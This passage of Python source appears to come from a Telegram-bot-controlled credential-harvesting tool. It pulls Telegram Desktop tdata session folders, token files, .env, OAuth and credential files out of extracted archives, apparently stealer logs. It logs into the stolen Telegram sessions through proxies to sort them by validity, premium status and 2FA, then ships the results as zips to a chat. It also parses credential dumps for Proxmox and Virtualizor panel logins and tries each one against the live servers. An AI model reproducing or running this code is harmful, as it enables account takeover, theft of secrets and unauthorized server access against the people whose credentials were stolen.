        "Dead accounts        : %d\n\n" % (len(dead_set) + len(exp_set)) +
        "--- VALID ---\n" + ("".join(aline(r) for r in live_set) or "  none\n") +
        ("--- EXPIRED ---\n%s" % "".join(aline(r) for r in exp_set) if exp_set else "") +
        ("--- DEAD ---\n%s" % "".join(aline(r) for r in dead_set) if dead_set else "") +
        ("--- ERRORS ---\n%s" % "".join(aline(r) for r in err_set) if err_set else ""))
    zpath = OUT / "auth_report.zip"
    try:
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("report.txt", report)
            for rel, path in pairs:
                try: z.write(path, "source/" + rel.replace("\\", "_"))
                except Exception: pass
            for fp in sorted((OUT / "results").rglob("*")):
                if fp.is_file():
                    z.write(fp, "results/" + str(fp.relative_to(OUT / "results")))
        cap = (f"{gold_header('AUTH CHECK DONE', esc(str(len(results)) + ' files'))}\n{THIN}\n"
               f"✅ {bold('Valid')}    {code(len(live_set))} "
               f"(💰 {len(prem_set)} premium / 🆓 {len(free_set)} free)\n"
               f"⏳ {bold('Expired')}  {code(len(exp_set))}   "
               f"❌ {bold('Dead')} {code(len(dead_set))}\n"
               f"⚠️ {bold('Errors')}   {code(len(err_set))}   "
               f"🌍 {bold('Proxies')} {code(len(proxies))}")
        okzip = upload(str(zpath), cap)
    except Exception as e:
        sys.stdout.write("auth zip: %s\n" % e); sys.stdout.flush()
        okzip = False
    return {"ck_total": len(results), "ck_live": len(live_set),
            "ck_prem": len(prem_set), "ck_free": len(free_set),
            "ck_exp": len(exp_set), "ck_dead": len(dead_set),
            "ck_err": len(err_set), "ck_zip": bool(okzip),
            "ck_proxies": len(proxies)}

def find_tdata(root):
    """Exact-name match first: every folder literally named tdata / tdata2…
    at any depth. If NOTHING in the archive is named tdata, the signature
    files catch it (D877F783D4D88E81, map0/map1, key_datas, usertag…)."""
    out = []
    for p in root.rglob("*"):
        try:
            is_dir = p.is_dir()
        except OSError:
            continue
        if not is_dir:
            continue
        n = p.name.lower()
        if n == "tdata" or (n.startswith("tdata")
                            and (len(n) == 5 or n[5:].isdigit())):
            if not any(str(p).startswith(str(a) + os.sep) for a in out):
                out.append(p)
    sig = {"d877f783d4d88e81", "map0", "map1", "key_datas", "usertag",
           "shortcuts-default", "key_data"}
    extra = []
    for p in root.rglob("*"):
        try:
            is_dir = p.is_dir()
        except OSError:
            continue
        if not is_dir:
            continue
        try:
            names = {c.name.lower() for c in p.iterdir()}
        except OSError:
            continue
        if not sig & names:
            continue
        covered = any(str(p) == str(a) or str(p).startswith(str(a) + os.sep)
                      for a in out + extra)
        if not covered:
            extra.append(p)
    return out + extra

def pack_tdata(dirs):
    """tdata.zip holds every found folder as a PLAIN folder tree — no zip inside
    a zip. Each entry is keyed by the folder's own path inside the extracted
    archive, so hundreds of folders all named "tdata" never collide, and
    found_in.txt maps every path back to where it came from."""
    if not dirs:
        return None, 0
    zp = OUT / "tdata.zip"
    manifest, total, used = [], 0, {""}
    roots = [WORK / "ex", WORK / "tdex", WORK / "tdfull"]
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as big:
        for d in dirs:
            rel = d.name
            for root in roots:
                try:
                    rel = str(d.relative_to(root))
                except Exception:
                    continue
                if root != WORK / "ex":
                    rel = "%s/%s" % (root.name, rel)
                break
            rel = re.sub(r"[^\w./-]", "_", rel.strip("/")) or d.name
            while rel.lower() in used:                     # two hunt passes, same path
                rel = rel + "_2"
            used.add(rel.lower())
            files = 0
            for f in sorted(d.rglob("*")):
                try:
                    if f.is_file():
                        big.write(str(f), "%s/%s" % (rel, f.relative_to(d)))
                        files += 1
                except Exception:
                    pass
            if files:
                total += 1
                manifest.append("%s/  (%d files)" % (rel, files))
            else:
                manifest.append("(empty) %s/" % rel)
        big.writestr("found_in.txt",
                     "TDATA FOLDERS IN THIS ARCHIVE\n%s\nEvery folder below is a plain\n"
                     "folder inside tdata.zip (unzip and use it directly):\n\n%s\n" %
                     ("=" * 48, "\n".join(manifest)))
    return zp, total

TOKEN_NAMES = ("tokens.txt", "token.txt")

def check_tdata(tdirs):
    """Runs on the RUNNER: proxy-check every tdata. Live card, buckets zip.
    Returns tk_* dict for the payload. Never raises."""
    from concurrent.futures.thread import ThreadPoolExecutor
    out = {"tk_total": len(tdirs), "tk_valid": 0, "tk_prem": 0, "tk_2fa": 0,
           "tk_frozen": 0, "tk_dead": 0, "tk_err": 0, "tk_zip": False}
    if stop():
        return out
    if not tdirs:
        return out
    proxies = auth_fetch_proxies()
    out["tk_proxies"] = len(proxies)
    sys.stdout.write("tdcheck: %d folders, %d proxies\n"
                     % (len(tdirs), len(proxies))); sys.stdout.flush()
    tick("tdatacheck", 90, tk_total=out["tk_total"], tk_done=0,
         tk_valid=0, tk_prem=0, tk_2fa=0, tk_frozen=0, tk_dead=0, tk_err=0,
         tk_proxies=len(proxies))

    # opentele turns a tdata folder into a real telethon client; telethon
    # needs python-socks to hop through the HTTP proxies. No VPN, no VM apps —
    # everything is fetched at check time on the runner itself.
    def ensure_pkgs():
        for pkg in ("opentele", "python-socks"):
            try:
                __import__(pkg)
                continue
            except ImportError:
                pass
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                            pkg], timeout=600,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            import opentele  # noqa
            return True
        except Exception as e:
            sys.stdout.write("tdcheck: opentele unavailable: %s\n" % e)
            sys.stdout.flush()
            return False
    if not ensure_pkgs():
        sys.stdout.write("tdcheck: package install failed — aborting cleanly\n")
        sys.stdout.flush()
        out["tk_err"] = len(tdirs)
        tick("tdatacheck", 96, **out)
        return out

    def parse_proxy(p):
        m = re.match(r"(\w+)://(?:([^:@]+)(?::([^@]*))?@)?([^:/]+)(?::(\d+))?", p)
        if not m:
            return None
        scheme, user, pw, host, port = m.groups()
        return (scheme.lower() or "http", user, pw, host, int(port or 80))

    # state per folder
    seen = set()
    dedup = []
    for d in tdirs:
        rp = os.path.realpath(str(d))
        if rp not in seen:
            seen.add(rp)
            dedup.append(d)
    tdirs = dedup
    out["tk_total"] = len(tdirs)
    res = [dict(orig=str(d), status="err", reason="", phone="-", user="-",
                prem=False, tfa=False, proxy="-") for d in tdirs]
    MAX_TRY = 2

    # ── dedicated "TDATA CHECKING" progress card (its own message) ──
    CARD = {"t": 0.0}

    def td_card(force=False):
        """Paint the separate live checking card — throttled to 1 edit/12s."""
        if not force and time.time() - CARD["t"] < 12:
            return
        CARD["t"] = time.time()
        done = [r for r in res if r["status"] != "err"]
        pend = [r for r in res if r["status"] == "err"]
        v = [r for r in done if r["status"] == "valid"]
        pct_v = (len(done) * 100 // max(len(res), 1)) if res else 100
        sub = esc('%d / %d folders' % (len(done), len(res)))
        txt = (f"{gold_header('TDATA CHECKING', sub)}\n{THIN}\n"
               f"{bar(pct_v)}\n"
               f"✅ {bold('Valid')}  {code(len(v))}  ·  ★ {bold('Premium')}  "
               f"{code(sum(1 for r in v if r['prem']))}  ·  🔒 {bold('2FA')}  "
               f"{code(sum(1 for r in v if r['tfa']))}\n"
               f"🧊 {bold('Frozen')}  {code(sum(1 for r in done if r['status'] == 'frozen'))}"
               f"  ·  💀 {bold('Dead')}  {code(sum(1 for r in done if r['status'] == 'dead'))}\n"
               f"⏳ {bold('Checking')} {code(len(pend))}  ·  🌍 {bold('Proxies')} "
               f"{code(len(proxies) or 1)}"
               + (f"  ·  🗒 {bold('Now')} {code(Path(pend[0]['orig']).name[:38])}"
                  if pend else ""))
        try:
            new_card(txt)
        except Exception:
            pass

    def progress():
        done = [r for r in res if r["status"] in ("valid", "frozen", "dead")]
        v = [r for r in done if r["status"] == "valid"]
        tick("tdatacheck", 90, tk_total=out["tk_total"], tk_done=len(done),
             tk_valid=len(v), tk_prem=sum(1 for r in v if r["prem"]),
             tk_2fa=sum(1 for r in v if r["tfa"]),
             tk_frozen=sum(1 for r in done if r["status"] == "frozen"),
             tk_dead=sum(1 for r in done if r["status"] == "dead"),
             tk_err=sum(1 for r in res if r["status"] == "err"),
             tk_proxies=len(proxies))
        td_card()

    def check_one(i, seed):
        r = res[i]
        tdir = r["orig"]
        proxy = None
        if proxies and seed < MAX_TRY - 1:
            proxy = proxies[(seed * 7919 + i) % len(proxies)]
        r["proxy"] = proxy or "direct"
        from telethon import errors, functions
        from opentele.td import TDesktop
        prox = None
        if proxy:
            scheme, user, pw, host, port = parse_proxy(proxy)
            import socks
            t = {"http": socks.HTTP, "socks4": socks.SOCKS4,
                 "socks5": socks.SOCKS5}.get(scheme, socks.SOCKS5)
            prox = (t, host, port, True, user, pw)
        try:
            td = TDesktop(tdir)
            if not td.isLoaded():
                raise RuntimeError("tdata folder failed to load/decrypt")
            c = td.ToTelethon(session=str(WORK / ("tks_%d" % i)), proxy=prox)

            import asyncio
            async def _m():
                try:
                    await c.connect()
                    if not c.is_user_authorized():
                        raise errors.UnauthorizedError(
                            None) if hasattr(errors, "UnauthorizedError") \
                            else RuntimeError("unauthorized")
                    me = await c.get_me()
                    full = await c(functions.users.GetFullUserRequest(me.id))
                    prem = bool(getattr(full.full_user, "premium", False))
                    try:
                        pwq = await c(functions.account.GetPasswordRequest())
                        tfa = bool(getattr(pwq, "current_algo", None))
                    except Exception:
                        tfa = False
                    phone = getattr(me, "phone_number", "") or "-"
                    uname = ("@" + me.username) if getattr(me, "username",
                                                           None) else (me.first_name or "-")
                    return "valid", "", str(phone), str(uname), prem, tfa
                finally:
                    try: await c.disconnect()
                    except Exception: pass
            loop = asyncio.new_event_loop()
            try:
                ret = loop.run_until_complete(asyncio.wait_for(_m(), 90))
            finally:
                loop.close()
            st_, why, phone, uname, prem, tfa = ret
            r.update(status=st_, reason=why, phone=phone, user=uname,
                     prem=prem, tfa=tfa)
        except Exception as e:
            n, m = type(e).__name__, str(e)[:90]
            if "DeactivatedBan" in n or "deactivated, ban" in m.lower() \
                    or "banned" in m.lower():
                r.update(status="frozen", reason=m)
            elif "UserDeactivated" in n or "SessionRevoked" in n \
                    or "AuthKeyUnregistered" in n or "Unauthorized" in n \
                    or "revoked" in m.lower() or "unregistered" in m.lower():
                r.update(status="dead", reason=m)
            else:
                r.update(status="err", reason=m)
        finally:
            for f in (WORK / ("tks_%d.session" % i),
                      WORK / ("tks_%d.session-journal" % i)):
                try: f.unlink(missing_ok=True)
                except Exception: pass

    tstart = time.time()
    td_card(True)
    for seed in range(MAX_TRY):
        if stop():
            return {}
        pend = [i for i, r in enumerate(res) if r["status"] == "err"]
        if not pend:
            break
        progress()
        for k in range(0, len(pend), 5):
            if stop():
                return {}
            with ThreadPoolExecutor(
                    max_workers=min(5, len(pend) - k)) as exr:
                for _ in exr.map(check_one, pend[k:k + 5], [seed] * (len(pend) - k)):
                    if stop():
                        return {}
            progress()
    td_card(True)
    sys.stdout.write("tdcheck rounds done in %.1fs\n"
                     % (time.time() - tstart)); sys.stdout.flush()

    # leftovers still error → dead bucket target but reported honestly
    for r in res:
        if r["status"] == "err":
            r["status"] = "dead"
            r["reason"] = "unreachable after %d attempts: %s" % (MAX_TRY, r["reason"])

    valid = [r for r in res if r["status"] == "valid"]
    prem  = [r for r in valid if r["prem"]]
    free  = [r for r in valid if not r["prem"]]
    twofa = [r for r in valid if r["tfa"]]
    fro   = [r for r in res if r["status"] == "frozen"]
    dead  = [r for r in res if r["status"] == "dead"]
    out.update(tk_valid=len(valid), tk_prem=len(prem), tk_2fa=len(twofa),
               tk_frozen=len(fro), tk_dead=len(dead), tk_err=0)
    tick("tdatacheck", 96, tk_total=out["tk_total"], tk_done=len(res),
         tk_valid=len(valid), tk_prem=len(prem), tk_2fa=len(twofa),
         tk_frozen=len(fro), tk_dead=len(dead), tk_err=0,
         tk_proxies=len(proxies))

    def tline(r):
        return ("Folder: %s\nPhone: %s | User: %s | Premium: %s | 2FA: %s\n"
                "Status: %s | %s\nProxy: %s\n%s\n"
                % (r["orig"].replace(str(WORK / "ex") + "/", "")
                   .replace(str(WORK / "tdex") + "/", "")
                   .replace(str(WORK / "tdfull") + "/", ""),
                   r.get("phone", "-"), r.get("user", "-"),
                   "YES" if r.get("prem") else "no",
                   "YES" if r.get("tfa") else "no",
                   r["status"], r.get("reason", ""),
                   r.get("proxy", "-"), "-" * 48))

    # buckets: VALID(VALID_P/VALID_F) FROZEN DEAD + copies of the checked folders
    try:
        (OUT / "tdresults").mkdir(parents=True, exist_ok=True)
        BASE = WORK / "ex"
        for fold, rows in (("VALID", valid), ("FROZEN", fro), ("DEAD", dead)):
            if not rows:
                continue
            d = OUT / "tdresults" / fold
            d.mkdir(parents=True, exist_ok=True)
            hits = ""
            for n, r in enumerate(rows, 1):
                tag = re.sub(r"[^\w.-]", "_",
                             r["orig"].replace(str(BASE) + "/", ""))[-60:]
                info = d / ("%s.txt" % tag)
                info.write_text(tline(r), encoding="utf-8")
                hits += tline(r)
            (d / "hits.txt").write_text(hits, encoding="utf-8")
        with open(OUT / "tdresults/all_results.json", "w", encoding="utf-8") as f:
            json.dump(res, f, ensure_ascii=False)
        with open(OUT / "tdresults/proxies_used.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(proxies) + "\n")
    except Exception as e:
        sys.stdout.write("tdcheck buckets: %s\n" % e); sys.stdout.flush()

    report = ("==================================================\n   TDATA CHECKER REPORT\n"
              "   %s\n" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) +
              "==================================================\n\n"
              "Total tdata folders   : %d\n" % len(res) +
              "Proxies used          : %d\n\n" % len(proxies) +
              "VALID sessions        : %d\n" % len(valid) +
              "  PREMIUM             : %d\n" % len(prem) +
              "  FREE                : %d\n" % len(free) +
              "2FA on                : %d\n" % len(twofa) +
              "FROZEN / deactivated  : %d\n" % len(fro) +
              "DEAD / revoked        : %d\n\n" % len(dead) +
              "--- VALID ---\n" + ("".join(tline(r) for r in valid) or "  none\n") +
              ("--- FROZEN ---\n%s" % "".join(tline(r) for r in fro) if fro else "") +
              ("--- DEAD ---\n%s" % "".join(tline(r) for r in dead) if dead else ""))
    zpath = OUT / "tdata_report.zip"
    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("report.txt", report)
        for fp in sorted((OUT / "tdresults").rglob("*")):
            if fp.is_file():
                z.write(fp, str(fp.relative_to(OUT / "tdresults")))
    def tdcap(size, idx, count, tot, split):
        return (f"{gold_header('TDATA CHECK DONE', esc(str(len(res)) + ' folders'))}"
                f"\n{THIN}\n"
                f"✅ {bold('Valid')}     {code(len(valid))}  ★ {bold('Premium')}  "
                f"{code(len(prem))} · ⛅ {bold('Free')}  {code(len(free))}\n"
                f"🔒 {bold('2FA on')}   {code(len(twofa))}\n"
                f"🧊 {bold('Frozen')}    {code(len(fro))}  ·  💀 {bold('Dead')}  "
                f"{code(len(dead))}\n"
                f"🌐 {bold('Proxies')}   {code(len(proxies) or 1)} · live feed\n"
                + ship_note(idx, count, size, tot, split, "tdata_report.zip"))
    n_parts, link = ship(zpath, tdcap)
    if link:
        out["tk_link"] = link
    out["tk_zip"] = n_parts > 0
    return out


def find_tokens(roots):
    """Every tokens.txt / token.txt in the extracted trees — Telegram Desktop
    clients drop these next to (or beside) the tdata folders."""
    out = []
    for root in roots:
        try:
            if not root.exists():
                continue
            for p in root.rglob("*"):
                try:
                    if p.is_file() and p.name.lower() in TOKEN_NAMES:
                        out.append(p)
                except OSError:
                    continue
        except OSError:
            continue
    return out

def pack_tokens(files):
    """tokens.zip: each file becomes <the folder it was found in>_file_token.txt,
    duplicates get _2/_3, and found_in.txt maps every name back to its origin
    path inside the archive."""
    if not files:
        return None, 0
    zp = OUT / "tokens.zip"
    manifest, used, total = [], {""}, 0
    base = WORK / "ex"
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
        for p in files:
            folder = re.sub(r"[^\w.-]", "_", p.parent.name) or "root"
            name, k = "%s_file_token.txt" % folder, 2
            while name.lower() in used:
                name = "%s_file_token_%d.txt" % (folder, k)
                k += 1
            used.add(name.lower())
            try:
                z.write(str(p), name)
            except Exception:
                continue
            try:
                rel = str(p.relative_to(base))
            except Exception:
                rel = str(p)
            manifest.append("%s  <-  %s" % (name, rel))
            total += 1
        if not total:
            zp.unlink(missing_ok=True)
            return None, 0
        z.writestr("found_in.txt",
                   "TOKEN FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
                   ("=" * 48, "\n".join(manifest)))
    return zp, total

def find_json(roots):
    """Every .json in the trees except auth.json (that one has its own flow)."""
    out = []
    for root in roots:
        try:
            if not root or not Path(root).exists():
                continue
            for p in root.rglob("*"):
                try:
                    if p.is_file() and p.name.lower().endswith(".json") \
                            and p.name.lower() != "auth.json":
                        out.append(p)
                except OSError:
                    continue
        except OSError:
            continue
    return out

def pack_json(files):
    """json_files.zip: every JSON with its ORIGINAL name; duplicate names get
    name_#1.json, name_#2.json… found_in.txt maps each to its origin path."""
    if not files:
        return None, 0
    zp = OUT / "json_files.zip"
    used, manifest, total = {"", }, [], 0
    base = WORK / "ex"
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
        for p in files:
            stem, ext = os.path.splitext(p.name)
            name, k = p.name, 1
            while name.lower() in used:
                name = "%s_#%d%s" % (stem, k, ext)
                k += 1
            try:
                z.write(str(p), name)
            except Exception:
                continue
            used.add(name.lower())
            try:
                rel = str(p.relative_to(base))
            except Exception:
                rel = str(p)
            manifest.append("%s  <-  %s" % (name, rel))
            total += 1
        if not total:
            zp.unlink(missing_ok=True)
            return None, 0
        z.writestr("found_in.txt",
                   "JSON FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
                   ("=" * 48, "\n".join(manifest)))
    return zp, total

# secret-ish files collected automatically (like tokens.txt)
SECRET_NAMES = {
    "credentials.json": "credentials_json",
    "oauth_creds.json": "oauth_creds_json",
    "oauth.json": "oauth_json",
    "token.json": "token_json",
    "tokens.json": "tokens_json",
    "secrets.json": "secrets_json",
    "apps.json": "apps_json",
    "config.yaml": "config_yaml",
    "config.yml": "config_yaml",
    "hosts.yml": "hosts_yml",
    "antigravity-oauth-token": "antigravity_oauth_token",
    "opencode.db": "opencode_db",
    ".secret": "secret",
    ".env": "env",
    ".env.local": "env_local",
    ".env.production": "env_production",
    ".netrc": "netrc",
}
SECRET_FILTERS = ["secrets.json", "credentials.json", "oauth*.json",
                  "token*.json", "tokens.json", "apps.json", "config.yaml",
                  "config.yml", "hosts.yml", "antigravity-oauth-token",
                  "opencode.db", "*.db", ".env*", "*.env", ".netrc",
                  "*.netrc", ".secret", "*.secret"]

def find_secrets(roots):
    """Every secret file (by exact name) anywhere in the trees."""
    out = []
    for root in roots:
        try:
            if not root or not Path(root).exists():
                continue
            for p in root.rglob("*"):
                try:
                    if p.is_file() and p.name.lower() in SECRET_NAMES:
                        out.append(p)
                except OSError:
                    continue
        except OSError:
            continue
    return out

def pack_secrets(files):
    """secrets.zip: one folder per file TYPE (env/, credentials_json/…);
    original names kept, duplicates become name_#1 / name_#2 inside the
    folder; found_in.txt maps every file to its origin path."""
    if not files:
        return None, 0
    zp = OUT / "secrets.zip"
    counts = dict.fromkeys(SECRET_NAMES.values(), 0)
    manifest, total = [], 0
    base = WORK / "ex"
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
        files.sort(key=lambda p: (p.name.lower(), str(p)))
        for p in files:
            fold = SECRET_NAMES.get(p.name.lower())
            if not fold:
                continue
            counts[fold] += 1
            n = counts[fold]
            if n <= 1:
                inner = p.name
            elif p.name.startswith("."):
                inner = "%s_#%d" % (p.name, n)
            else:
                stem, ext = os.path.splitext(p.name)
                inner = "%s_#%d%s" % (stem, n, ext)
            try:
                z.write(str(p), "%s/%s" % (fold, inner))
            except Exception:
                continue
            try:
                rel = str(p.relative_to(base))
            except Exception:
                rel = str(p)
            manifest.append("%s/%s  <-  %s" % (fold, inner, rel))
            total += 1
        if not total:
            zp.unlink(missing_ok=True)
            return None, 0
        z.writestr("found_in.txt",
                   "SECRET FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
                   ("=" * 48, "\n".join(manifest)))
    return zp, total

def finish(task, stage, **extra):
    """Terminal state for a job: paint the card, report to the bot, back to idle."""
    if stage == "done":
        # 1. The live console card stays in the chat. It used to be deleted
        #    here, so the whole run vanished the instant it finished. The card
        #    keeps the final console state (painted below by st()) and the
        #    summary goes out as its own message.
        if CHAT and PB[1]:
            sys.stdout.write("Live card %s kept in chat\n" % (PB[1],))
            sys.stdout.flush()

        # 2. Send Task Complete ✅
        if CHAT:
            try:
                tot_elapsed = ft(time.time() - (PB[2] or time.time()))
                is_vps = task.get("kind") in ("vps_promox", "vps_check")
                is_batch = task.get("kind") == "batch"
                if is_batch:
                    mode = task.get("mode") or "-"
                    lines = [
                        "✦ <b>Task Complete ✅</b>",
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        "📦 <b>Status:</b> Batch processed",
                        f"🔧 <b>Mode:</b> <code>{mode}</code>",
                        f"📁 <b>Files:</b> <code>{extra.get('files', 0)}</code>",
                        f"💾 <b>Total size:</b> <code>{fs(extra.get('bytes', 0))}</code>",
                    ]
                    if extra.get("total"):
                        lines.append(f"🔎 <b>Entries:</b> <code>{extra.get('total')}</code>")
                    if extra.get("reach") is not None:
                        lines.append(f"🌐 <b>Reachable:</b> <code>{extra.get('reach')}</code>")
                    if extra.get("valid") is not None:
                        lines.append(f"✅ <b>Valid:</b> <code>{extra.get('valid')}</code>")
                    if extra.get("cookies"):
                        lines.append(f"🍪 <b>Sessions:</b> <code>{extra.get('cookies')}</code>")
                    lines.extend([
                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
                        f"🧹 <b>Disk:</b> Wiped clean",
                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
                    ])
                elif is_vps:
                    lines = [
                        "✦ <b>Task Complete ✅</b>",
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        "📦 <b>Status:</b> VPS scan completed",
                        f"🔎 <b>Total:</b> <code>{extra.get('total', 0)}</code>",
                        f"🌐 <b>Reachable:</b> <code>{extra.get('reach', extra.get('valid', 0))}</code>",
                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
                    ]
                else:
                    cookies_cnt = extra.get("cookies", 0)
                    sent_cnt = len(extra.get("sent") or [])
                    lines = [
                        "✦ <b>Task Complete ✅</b>",
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        "📦 <b>Status:</b> All files extracted & delivered",
                        f"📤 <b>Files sent:</b> <code>{sent_cnt}</code>",
                        f"🍪 <b>Sessions:</b> <code>{cookies_cnt}</code>",
                    ]
                    if extra.get("td_total"):
                        lines.append(f"🗃 <b>Tdata:</b> <code>{extra['td_total']}</code>")
                    if extra.get("tok_total"):
                        lines.append(f"🎟 <b>Tokens:</b> <code>{extra['tok_total']}</code>")
                    if extra.get("js_total"):
                        lines.append(f"🗂 <b>JSON:</b> <code>{extra['js_total']}</code>")
                    if extra.get("sec_total"):
                        lines.append(f"🗝 <b>Secrets:</b> <code>{extra['sec_total']}</code>")
                    lines.extend([
                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
                        f"🧹 <b>Disk:</b> Wiped clean",
                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
                    ])
                tg_post(TG_API + "sendMessage", tries=5, timeout=15, json={
                    "chat_id": CHAT,
                    "text": "\n".join(lines),
                    "parse_mode": "HTML",
                    "reply_markup": {
                        "inline_keyboard": [
                            [{"text": "« Back to Menu", "callback_data": "menu_home"}]
                        ]
                    }
                })
            except Exception as e:
                sys.stdout.write("Send Task Complete err: %s\n" % e)
                sys.stdout.flush()

    st(stage, 100 if stage == "done" else _state.get("pct", 0),
       job=task.get("job"), vm=SPECS,
       **{k: extra[k] for k in extra if k in ("err", "tried")})
    payload = {"job": task.get("job"), "stage": stage, "uid": task.get("chat")}
    payload.update({k: extra[k] for k in extra
                    if k in ("err", "found", "cookies", "tried", "sent", "failed",
                             "links", "auth", "auth_sent", "auth_fid", "td_total",
                             "td_parts", "td_via", "tok_total", "tok_parts",
                             "js_total", "js_parts", "sec_total", "sec_parts",
                             "tk_total", "tk_valid",
                             "tk_prem", "tk_2fa", "tk_frozen", "tk_dead",
                             "tk_err", "tk_zip", "tk_proxies", "tk_link",
                             "ck_total", "ck_live", "ck_prem", "ck_free",
                             "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies",
                             "total", "reach", "invalid", "unreach",
                             "valid", "bad", "errors",
                             "files", "bytes", "mode")})
    payload["pubs"] = PB[3]
    report(payload)
    PB[1] = None


# ── VPS jobs (/vps_promox, /vps_check): same card, same download, engine ──

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

VPS_PANL = ":8006"
VPS_LINE = re.compile(
    r"(https?://[^\s:]+:\d{1,5}(?:/[^\s:]*)?):([^/:\s]{1,64}):(.{1,80})")
VPS_TUNE   = 64          # reachability threads (all vCPUs)
VPS_CHECKS = 50          # login-check threads
VPS_RETRY  = 2           # extra attempts for network errors

def vps_hits(path):
    """ripgrep-style panel scan — the file is STREAMED line by line, so a 3.9 GB
    dump is scanned with a few MB of RAM (loading it whole OOM-kills the runner).
    Zip archives are unpacked and every inner file is scanned the same way."""
    with open(path, "rb") as fh:
        magic = fh.read(4)
    files = [str(path)]
    if magic == b"PK\x03\x04":
        exd = WORK / "vpsun"
        try:
            shutil.rmtree(exd, ignore_errors=True)
            exd.mkdir(parents=True)
            with zipfile.ZipFile(path) as z:
                z.extractall(exd)
            files = [os.path.join(root, fn)
                     for root, _d, fns in os.walk(str(exd)) for fn in sorted(fns)]
        except Exception:
            files = [str(path)]
    seen, hits = set(), []
    anchor = VPS_PANL.encode()
    for fp in files:
        try:
            fh = open(fp, "rb")
        except Exception:
            continue
        with fh:
            n = 0
            for raw in fh:
                n += 1
                if n % 5_000_000 == 0:
                    tick("scan", 96, msg="filtering the panel lines (streamed)…",
                         scanned=n, found=len(hits))
                if anchor not in raw:
                    continue
                line = raw.decode("utf-8", "ignore")
                m = VPS_LINE.search(line)
                if not m:
                    continue
                key = (m.group(1).strip(), m.group(2).strip(), m.group(3).strip())
                if key in seen or not key[0] or not key[1]:
                    continue
                seen.add(key)
                hits.append(key)
    return hits

def vps_extract(text):
    """ripgrep-style: one cheap substring reject per line, exact regex second,
    deduped. Returns [(url, user, pass), ...] — never raises."""
    seen, hits = set(), []
    for line in text.splitlines():
        if VPS_PANL not in line:
            continue
        m = VPS_LINE.search(line)
        if not m:
            continue
        key = (m.group(1).strip(), m.group(2).strip(), m.group(3).strip())
        if key in seen or not key[0] or not key[1]:
            continue
        seen.add(key)
        hits.append(key)
    return hits

def vps_probe(entry):
    """('ok'|'invalid'|'dead', note) — is the panel up and really Proxmox VE?"""
    url, user, pwd = entry
    try:
        r = requests.get(url, timeout=8, verify=False, allow_redirects=True,
                         headers={"User-Agent": "Mozilla/5.0 (Proxmox checker)"})
    except Exception as e:
        return "dead", type(e).__name__
    if r.status_code >= 500:
        return "dead", "HTTP %s" % r.status_code
    html = (r.text or "")[:20000].lower()
    is_pve = ("proxmox" in html
              or ("pve" in html and ("extjs" in html or "pve2" in html or "/pve" in html)))
    return ("ok", "HTTP %s" % r.status_code) if is_pve else ("invalid", "HTTP %s" % r.status_code)

def vps_login(entry):
    """('valid'|'bad'|'error', note) — the same POST the web GUI itself makes."""
    url, user, pwd = entry
    base = url.rstrip("/") + "/api2/json/access/ticket"
    note = "no attempt"
    for attempt in range(1 + VPS_RETRY):
        saw_401 = False
        for uname in ("%s@pam" % user, "%s@pve" % user, user):
            try:
                r = requests.post(base, timeout=12, verify=False,
                                  data={"username": uname, "password": pwd},
                                  headers={"User-Agent": "Mozilla/5.0 (Proxmox checker)"})
            except Exception as e:
                note = "%s: %s" % (type(e).__name__, str(e)[:60])
                break                              # network down for every realm
            if r.status_code == 200:
                try:
                    d = r.json().get("data") or {}
                except Exception:
                    d = {}
                if d.get("ticket"):
                    return "valid", uname
                note = "200 without ticket"
                continue
            if r.status_code == 401:
                saw_401 = True                      # panel alive, these creds rejected
                continue
            note = "HTTP %s" % r.status_code
        else:
            return ("bad", "authentication failure") if saw_401 else ("error", note)
        if attempt < VPS_RETRY:
            time.sleep(1)                           # retry: fresh attempt after 1s
    return "error", note

# ── Virtualizor (/vps_virtl, /vps_verify): same streamed scan as the proxmox one ──

VIRTL_PANL = ":4083"
# The dump mixes real panel lines with junk, so the regex stays strict on the
# port and the credential shape, but the host part stays permissive.
VIRTL_LINE = re.compile(
    r"(https?://[^\s:]+:\d{1,5}(?:/[^\s:]*)?):([^/:\s]{1,64}):([^\s]{1,80})")
VIRTL_HOST = re.compile(
    r"^([a-zA-Z0-9.\-]+:\d{1,5})(?:/[^\s:]*)?:([^/:\s]{1,64}):([^\s]{1,80})")
VIRTL_SPACE = re.compile(
    r"^(?:panel\s+)?([a-zA-Z0-9.\-]+:\d{1,5})\s+([^\s:/]{1,64})\s+([^\s]{1,80})$")
VIRTL_UA = "Mozilla/5.0 (Virtualizor checker)"
VIRTL_TUNE = 64          # reachability threads
VIRTL_CHECKS = 50        # login-check threads
VIRTL_RETRY = 2          # extra attempts for network errors


def virtl_parse_line(line):
    """Return (url, user, pass) for one virtualizer line, or None.

    Mirrors the Go ParseVPSEntries fallback chain so the same dump lines are
    picked up by both engines."""
    m = VIRTL_LINE.search(line)
    if m:
        host, u, p = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
    else:
        host = u = p = ""
        for rx in (VIRTL_SPACE, VIRTL_HOST):
            m2 = rx.search(line)
            if m2:
